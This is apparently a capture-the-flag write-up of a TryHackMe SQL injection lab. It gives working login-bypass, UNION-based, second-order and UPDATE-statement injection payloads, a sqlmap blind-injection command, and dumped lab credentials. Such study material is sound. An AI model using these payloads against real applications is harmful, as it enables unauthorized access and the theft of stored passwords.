---
layout: post
title:  THM SQL Injection Lab Write-up
description: Part of the OSCP+ Preparation Series
date:   2024-11-11 00:00:00 +0300
image:  '/images/thm_sql_injection_lab.png'
tags:   [Write-ups, THM, OSCP+, Easy, Web-Pentesting, SQL-Injection, Manual-SQL-Injection, SQLMap]
---

# Table of Contents
- [Task 1 - Deploy and access the machine](#task-1---deploy-and-access-the-machine)
- [Task 2 - Introduction to SQL Injection: Part 1](#task-2---introduction-to-sql-injection-part-1)
- [Task 3 - Introduction to SQL Injection: Part 2](#task-3---introduction-to-sql-injection-part-2)
- [Task 4 - Broken Authentication 1](#task-4---broken-authentication)
- [Task 5 - Broken Authentication 2](#task-5---broken-authentication)
- [Task 6 - Broken Authentication 3 (Blind Injection)](#task-6---broken-authentication-3-blind-injection)
- [Task 7 - Vulnerable Notes](#task-7---vulnerable-notes)
- [Task 8 - Vulnerable Startup: Change Password](#task-8---vulnerable-startup-change-password)
- [Task 9 - Vulnerable Startup: Book Title](#task-9---vulnerable-startup-book-title)
- [Task 10 - Vulnerable Startup: Book Title 2](#task-10---vulnerable-startup-book-title-2)

# Introduction
### Task 1 - Deploy and access the machine

Deploy the vulnerable machine and visit the IP at Port 5000:

```shell
http://10.10.53.135:5000
```

### Task 2 - Introduction to SQL Injection: Part 1
Note: The following payloads are being entered on the ProfileID input. As Password we are entering anything we want.

#### Input Box String

```shell
# Standard payload which should work
1 or 1=1-- -
```
The payload above will tell us that account doesnt exist, so we will need to use '':

```shell
# Solution that worked
'' or 1=1-- -
```

#### Input Box Non-String

```shell
# Standard payload which should work
'1 or '1'='1'-- -
```

Same as above, it will tell us that the account doesnt exist. We will need to use ''':
```shell
# Payload that worked
''' or '1'='1'-- -
```

#### URL Injection
Enter anything as username and credentials and get the resultant URL on the top of our browser

```shell
http://10.10.147.249:5000/sesqli3/login?profileID=a&password=a
```
Change the profileID content to our SQL injection payload

```shell
http://10.10.147.249:5000/sesqli3/login?profileID=-1' or 1=1-- -&password=a
```
Go to CyberChef and URL encode it

```shell
http://10.10.147.249:5000/sesqli3/login?profileID=-1'%20or%201=1--%20-&password=a
```
Enter the URL encoded URL on our web browser and we will be able to bypass the login

#### POST Injection
Start FoxyProxy on Firefox and Burp Suite. Enter anything as username and password and capture the request with Burp Suite. The captured request will look like this:

```shell
POST /sesqli4/login HTTP/1.1
Host: 10.10.147.249:5000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 22
Origin: http://10.10.147.249:5000
Connection: keep-alive
Referer: http://10.10.147.249:5000/sesqli4/login
Cookie: session=.eJy90T1rAzEMBuD_4jmDZclfN5dCl2ydgyzLcPTSS-9SSgn573WaUjp0yJTNegXCj3Qyq65v0wi7ykc2w8k8Pz2YATZG9zxOZjBmY155r_31uPCrzON6SUZ52V7TXh14XQ_zctwuvU7Beue9BbKJfpof81J7iyRhi1a4IYNkFhKK1WXyaltMLVb0HCUDcVJIEJBFHSaGohqgXKYtcxsnvfzRgO3ByhMvn2Zw3p43v5j3VZfdWL8h18zdAxhDsT6R5lyiLZRj4UAJfQH1SuoseEc-Bs7AMSFy6lYIWlBQ-sRbge4fIN4DKNJIwEJOXrEo98vFLuAWiqaMNtUivd-6EauWvoB-Xwrias0EILcC8Q_w_AWU8MZk.ZzEb9g.d58tkAuuBx1kA0TC_RMFoVpK_bU
Upgrade-Insecure-Requests: 1

profileID=a&password=a
```

Now we need to change this part:

```shell
profileID=a&password=a
```

To the following:

```shell
profileID=-1' or 1=1-- -&password=a
```

And click on Forward, we will get access after forwarding the request (Forward the request that appears after forwarding the first one as well). The final edited request will look like this:

```shell
POST /sesqli4/login HTTP/1.1
Host: 10.10.147.249:5000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 22
Origin: http://10.10.147.249:5000
Connection: keep-alive
Referer: http://10.10.147.249:5000/sesqli4/login
Cookie: session=.eJy90T1rAzEMBuD_4jmDZclfN5dCl2ydgyzLcPTSS-9SSgn573WaUjp0yJTNegXCj3Qyq65v0wi7ykc2w8k8Pz2YATZG9zxOZjBmY155r_31uPCrzON6SUZ52V7TXh14XQ_zctwuvU7Beue9BbKJfpof81J7iyRhi1a4IYNkFhKK1WXyaltMLVb0HCUDcVJIEJBFHSaGohqgXKYtcxsnvfzRgO3ByhMvn2Zw3p43v5j3VZfdWL8h18zdAxhDsT6R5lyiLZRj4UAJfQH1SuoseEc-Bs7AMSFy6lYIWlBQ-sRbge4fIN4DKNJIwEJOXrEo98vFLuAWiqaMNtUivd-6EauWvoB-Xwrias0EILcC8Q_w_AWU8MZk.ZzEb9g.d58tkAuuBx1kA0TC_RMFoVpK_bU
Upgrade-Insecure-Requests: 1

profileID=-1' or 1=1-- -&password=a
```

### Task 3 - Introduction to SQL Injection: Part 2
#### UPDATE Statement
First log in using the following credentials:

```shell
# profileID
10

# password
toor
```

Once we are in, click on Edit Profile.

##### Detecting Vulnerability

Now do right-click -> View Source Code.

Examining the code, the part that is of interest to us is the following:

```shell
<div class="login-form">
    <form action="/sesqli5/profile" method="post">
        <h2 class="text-center">Edit Francois's Profile Information</h2>
        <div class="form-group">
            <label for="nickName">Nick Name:</label>
            <input type="text" class="form-control" placeholder="Nick Name" id="nickName" name="nickName" value="">
        </div>
        <div class="form-group">
            <label for="email">E-mail:</label>
            <input type="text" class="form-control" placeholder="E-mail" id="email" name="email" value="">
        </div>
        <div class="form-group">
            <label for="password">Password:</label>
            <input type="password" class="form-control" placeholder="Password" id="password" name="password">
        </div>
        <div class="form-group">
            <button type="submit" class="btn btn-primary btn-block">Change</button>
        </div>
        <div class="clearfix">
            <label class="pull-left checkbox-inline"></label>
        </div>
    </form>
</div>
```

Notice on the code that Nick Name and E-mail both user "name=", but Password uses "id=".

We got 3 input boxes: Nick Name, E-mail and Password.

If we enter the following payload only on the input E-mail:

```shell
asd',nickName='test',email='hacked
```

And we enter "a" as Nick Name and Password, we will see that the username got changed to test too, even if we entered "a" as Nick Name.

This means, if we enter the payload into the Nick Name only, only the Nick Name is updated. But if we enter the payload into the E-mail field, both fields Nick Name and E-mail are updated.

We managed to the a successful first test now, telling us that the application is vulnerable, and we also have the right amount of columns (If we didnt have the right amount of columns, the fields wouldnt have got updated).

##### Detecting Database and Version

Now we need to identify the database using the following payloads on the E-mail input and see which one give us a version number as a result when the Nick Name gets updated:

```shell
# MySQL and MSSQL
',nickName=@@version,email='

# For Oracle
',nickName=(SELECT banner FROM v$version),email='

# For SQLite
',nickName=sqlite_version(),email='
```

The following payload updated the Nick Name to 3.22.0:

```shell
# For SQLite
',nickName=sqlite_version(),email='
```

This means the database we are attacking is SQLite.

##### Detecting Tables and number of Columns using group_concat() and pragma_table_info()

Now that we know which database are we attacking, we can create queries taking this into consideration (We need to use only SQLite queries).

We can use the following payload edited with a SQLite query on the E-mail input to dump all database tables:

```shell
',nickName=(SELECT group_concat(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'),email='
```

Now we can see that there are two tables on the database if we inspect the Nick Name:

```shell
usertable,secrets
```

Now we need to enumerate the columns of each table. Using Google I found out that we can use the PRAGMA table_info() command to get the metadata of each column in a table, allowing us to enumerate the number of columns.

Lets do it with the usertable table:

```shell
',nickName=(SELECT group_concat(name) FROM pragma_table_info('usertable')),email='
```

This gave us as result the following:

```shell
UID,name,profileID,salary,passportNr,email,nickName,password
```

Now we know that the table usertable has 8 columns.

Lets do the same with the secrets table:

```shell
',nickName=(SELECT group_concat(name) FROM pragma_table_info('secrets')),email='
```

This gave us the following results:

```shell
id,author,secret
```

Now we know that the table secrets has 3 columns.

##### Getting the Content of each Column using group_concat()

Now we can create payloads with queries to get the contents of each column using group_concat().

Lets start with the usertable table:

```shell
',nickName=(SELECT group_concat(UID || ':' || name || ':' || profileID || ':' || salary || ':' || passportNr || ':' || email || ':' || nickName || ':' || password, '; ') FROM usertable),email='
```

This gave us the content in each column:

```shell
1:Francois:10:250:8605255014084::id,author,secret:ca978112ca1bbdcafac231b39a23dc4da786eff8147c4e72b9807785afee48bb; 2:Michandre:11:300:9104154800081:::05842ffb6dc90bef3543dd85ee50dd302f3d1f163de1a76eee073ee97d851937; 3:Colette:12:275:8403024800086:::c69d171e761fe56711e908515def631856c665dc234a0aa404b32c73bdbc81ac; 4:Phillip:13:400:8702245800084:::b6efdfb0e20a34908c092725db15ae0c3666b3cea558fa74e0667bd91a10a0d3; 5:Ivan:14:200:8601185800080:::be042a70c99d1c438cdcbd479b955e4fba33faf4f8c494239257e4248bbcf4ff; 6:Admin:99:100:8605255014084:::6ef110b045cbaa212258f7e5f08ed22216147594464427585871bfab9753ba25
```

Lets do the same with the secrets table:

```shell
',nickName=(SELECT group_concat(id || ':' || author || ':' || secret, '; ') FROM secrets),email='
```

And this is what we got:

```shell
1:1:Lorem ipsum dolor sit amet, consectetur adipiscing elit. Integer a.; 2:3:Donec viverra consequat quam, ut iaculis mi varius a. Phasellus.; 3:1:Aliquam vestibulum massa justo, in vulputate velit ultrices ac. Donec.; 4:5:Etiam feugiat elit at nisi pellentesque vulputate. Nunc euismod nulla.; 5:6:THM{REDACTED}
```

Nice! There is the flag we need.

### Task 4 - Broken Authentication
Goal: Find a way to bypass the authentication to retrieve the flag.

We can use the generic bypass payload below:
```shell
# Payload that worked without indicating user
' OR 1=1--
```

Or we can indicate the user we want to get access as if we know this user exists:
```shell
# Payload that worked without indicating user
admin'--
```

Both payloads will allow us to bypass login and get us to the flag.
### Task 5 - Broken Authentication
Goal: This challenge builds upon the previous challenge. Here, the goal is to find a way to dump all the passwords in the database to retrieve the flag without using blind injection.

#### Identifying number of columns with UNION SELECT
First we need to identify the number of columns. Enter the following payload on the username input:

```shell
' UNION SELECT 1--
' UNION SELECT 1,2--
' UNION SELECT 1,2,3--
```

Note that using 1 or 1,2,3 will give us the error message Invalid username or password.

But the following payload allowed us to log in successfully:

```shell
' UNION SELECT 1,2--
```

On the top right corner it also says "Logged in as 2".

#### Identifying Version with UNION SELECT
Now that we know the right number of columns (2), we can try to identify the database type and version:

```shell
# MySQL and MSSQL
' UNION SELECT 1, @@version--
```

The payload above didnt work. But the next payload will work:

```shell
# For SQLite
' UNION SELECT 1, sqlite_version()--
```

We can see on the right top that we are Logged in as 3.22.0.

#### Getting the password of all users with UNION SELECT
We can use the following payload to get the password of all users:

```shell
' UNION SELECT 1,group_concat(password) FROM users--
```

This gave us as result the following:

```shell
rcLYWHCxeGUsA9tH3GNV,asd,Summer2019!,345m3io4hj3,THM{REDACTED},viking123 |
```

There is the flag!

#### Information about admin cookie

It is important to note, that we can use the following payload to get access as admin:

```shell
' OR 1=1--
```

Then press F12 on Firefox, go to Storage and get the Value of the session cookie:

```shell
.eJyrVkrOSMzJSc1LTzWKLy1OLYrPTFGyMtRBF85LzE1VslJKTMnNzFOqBQAYpRNS.ZzExDg.RvLJg_JI-593D6bhYKTcuu3SV4Q
```

Then visit the following website and enter the cookie value:
https://www.kirsle.net/wizards/flask-session.cgi

The decoded cookie will look like this:

```shell
{
    "challenge2_user_id": 1,
    "challenge2_username": "admin"
}
```
### Task 6 - Broken Authentication 3 (Blind Injection)
Goal: This challenge has the same vulnerability as the previous one. However, it is no longer possible to extract data from the Flask session cookie or via the username display. The login form still has the same vulnerability, but this time the goal is to abuse the login form with blind SQL injection to extract the admin's password.

We can use SQLMap for this, since we are facing a Blind SQL Injection, it will be much easier and faster with SQLMap:

```shell
sqlmap -u "http://10.10.147.249:5000/challenge3/login" --data="username=admin&password=admin" --level=5 --risk=3 --dbms=sqlite --technique=B --dump
```

After running sqlmap successfully, we can retrieve the following:

```shell
+----+---------------------------------------+----------+
| id | password                              | username |
+----+---------------------------------------+----------+
| 1  | THM{<REDACTED>} | admin    |
| 3  | asd                                   | amanda   |
| 2  | Summer2019!                           | dev      |
| 5  | 345m3io4hj3                           | emil     |
| 4  | viking123                             | maja     |
+----+---------------------------------------+----------+
```

### Task 7 - Vulnerable Notes
Goal: Here, the previous vulnerabilities have been fixed, and the login form is no longer vulnerable to SQL injection. The team has added a new note function, allowing users to add notes on their page. The goal of this challenge is to find the vulnerability and dump the database to find the flag.

In this task, we are basically using the malicious name of the users we create to abuse a vulnerability and run these malicious names as SQL queries.

After reading the whole instructions on Task 7, we will create the malicious user.

First register a new account with the malicious username and log in using the credentials of the new account we create:

```shell
# Malicious username
' union select 1,2'
```

```shell
http://10.10.147.249:5000/challenge4/signup
http://10.10.147.249:5000/challenge4/login
```

With our malicious username, the application performs the following query when we click on Notes:

```shell
SELECT title, note FROM notes WHERE username = '' union select 1,2''
```

Now create a new username with the following username, log in and click on Notes:

```shell
' union select 1,group_concat(tbl_name) from sqlite_master where type='table' and tbl_name not like 'sqlite_%''
```

We will see at the bottom under number 1 the following:

```shell
users,notes
```

Lets create another username to enumerate the table users.

Enter the following as the new username:

```shell
'  union select 1,group_concat(password) from users'
```

Now log in with the new username and click on Notes, we will see the following:

```shell
rcLYWHCxeGUsA9tH3GNV,asd,Summer2019!,345m3io4hj3,THM{REDACTED},viking123,testtest,testtest,testtest,testtest,testtest,testtest,testtest
```

There is the flag!

### Task 8 - Vulnerable Startup: Change Password
Goal: For this challenge, the vulnerability on the note page has been fixed. A new change password function has been added to the application, so the users can now change their password by navigating to the Profile page. The new function is vulnerable to SQL injection because the UPDATE statement concatenates the username directly into the SQL query, as can be seen below. The goal here is to exploit the vulnerable function to gain access to the admin's account.

After reading the task instructions, we found out how to proceed.

Create a new username with the following username first:

```shell
admin'-- -
```

Then go Profile and change the password of our new username to the following as new password:

```shell
admin' -- -
```

Now we successfully changed the password of the real admin user to `admin' -- -`.

We can log out now and use the following credentials to log in as the real admin:

```shell
# Username
admin

# Password
admin' -- -
```

After logging in, we will see the flag.

### Task 9 - Vulnerable Startup: Book Title
Goal: A new function has been added to the page, and it is now possible to search books in the database. The new search function is vulnerable to SQL injection because it concatenates the user input directly into the SQL statement. The goal of the task is to abuse this vulnerability to find the hidden flag.

First, create a new user and log in.

After logging in, we will see the following message:

```shell
Testing a new function to search for books, check it out here
```

Click on the "here" link and we will find a Search function.

The Search function, actually performs GET requests with the parameter title searching for a book, we can actually run SQL queries as follow:

```shell
SELECT * from books WHERE id = (SELECT id FROM books WHERE title like '" + title + "%')
```

We got an example to dump all books of the database using the following payload on the Search input:

```shell
') or 1=1-- -
```

But this wont give us the flag.

Lets enumerate the number of columns first. We will use Booktitle (Found this title exists after running `') or 1=1-- -`) but we can also use test if we created a username called test:

```shell
Booktitle') order by 1-- -
Booktitle') order by 2-- -
Booktitle') order by 3-- -
Booktitle') order by 4-- -

Booktitle') order by 5-- - 
```

```shell
# Results we get until we try order by 5
Title: Booktitle
Nice description
Author: Tom Hanks
```

Note that after running order by 5 nothing is being displayed, this means the table has 4 columns.

Now that we know the table has 4 columns, we can try the following payload:

```shell
Booktitle') union select 1,2,3,4-- -
```

 This gave us some interesting results:
 
```shell
Title: 2
3
Author: 4
Title: Booktitle
Nice description
Author: Tom Hanks
```

It seems that columns 2,3 and 4 are vulnerable.

Now that we know which columns are vulnerable, we can try the following payload:

```shell
Booktitle') union select 1, group_concat(username),group_concat(password),4 from users-- -
```

This gave us the follow results:

```shell
Title: admin,dev,amanda,maja,emil,test,notahacker
THM{REDACTED},asd,Summer2019!,345m3io4hj3,viking123,testtest,notmypassword
Author: 4
Title: Booktitle
Nice description
Author: Tom Hanks
```

Note: I created another username called notahacker with the password notmypassword to show better in which column usernames and passwords are stored.

### Task 10 - Vulnerable Startup: Book Title 2
Goal: In this challenge, the application performs a query early in the process. It then uses the result from the first query in the second query later without sanitization. Both queries are vulnerable, and the first query can be exploited through blind SQL injection. However, since the second query is also vulnerable, it is possible to simplify the exploitation and use UNION based injection instead of Boolean-based blind injection; making the exploitation easier and less noisy. The goal of the task is to abuse this vulnerability without using blind SQL injection and retrieve the flag.

Create a new user and login. We will call our user test with password testtest.

After logging in, we will see the following message:

```shell
Testing a new function to search for books, check it out here
```

Click on the "here" link and we will find a Search function.

We will notice the following queries running under Executed Query:

```shell
Query 1:
SELECT id FROM books WHERE title like 'test%'
Query 2:
SELECT * FROM books WHERE id = '3'
```

This means, that this 2 queries are giving us the result we see above:

```shell
Title: test
description
Author: author
```

Lets try the following payload and see how the queries interact which each other:

```shell
' UNION SELECT '2'-- -
```

```shell
Query 1:
SELECT id FROM books WHERE title like '' UNION SELECT '1'-- -%'
Query 2:
SELECT * FROM books WHERE id = '1'
```

Lets try adding our username test at the start of the payload:

```shell
test' UNION SELECT '1'-- -
```

```shell
Query 1:
SELECT id FROM books WHERE title like 'test' UNION SELECT '1'-- -%'
Query 2:
SELECT * FROM books WHERE id = '3'
```

We can now see, if we add our username at the start, it wouldnt execute the second query, giving us the id 3 even if we wanted to get the id 1 in our payload.

We can run these two payloads targetting id 2 to see the difference easier:
```shell
' UNION SELECT '2'-- -
test' UNION SELECT '2'-- -
```

Now that we know how to run queries on query 2 through query 1, we will try to enumerate the number of columns:

```shell
' UNION SELECT '1' UNION SELECT 1,2,3,4-- -
```

But the payload above didnt work. We might need to edit it slightly with '1'' instead of '1':

```shell
' UNION SELECT '1'' UNION SELECT 1,2,3,4-- -
```

Nice! It worked now. We got 4 columns, with the columns 2,3 and 4 being vulnerable like in the previous task.

Note: If we try the following payloads we wont get anything displayed, thats how we can find out we got 4 columns:

```shell
' UNION SELECT '1'' UNION SELECT 1-- -
' UNION SELECT '1'' UNION SELECT 1,2-- -
' UNION SELECT '1'' UNION SELECT 1,2,3-- -
' UNION SELECT '1'' UNION SELECT 1,2,3,4,5-- -
```

Now we can craft our payload with group_concat() to get all the usernames and passwords:

```shell
' UNION SELECT '1'' UNION SELECT 1, group_concat(username),group_concat(password),4 from users-- -
```

This gave us the following results:

```shell

Title: Harry Potter and the Philosopher's Stone

When mysterious letters start arriving on his doorstep, Harry Potter has never heard of Hogwarts School of Witchcraft and Wizardry. They are swiftly confiscated by his aunt and uncle. Then, on Harry’s eleventh birthday, a strange man bursts in with some important news: Harry Potter is a wizard and has been awarded a place to study at Hogwarts. And so the first of the Harry Potter adventures is set to begin.

Author: J.K. Rowling
Title: admin,dev,amanda,maja,emil,test

THM{REDACTED},asd,Summer2019!,345m3io4hj3,viking123,testtest

Author: 4
```

There is the flag!

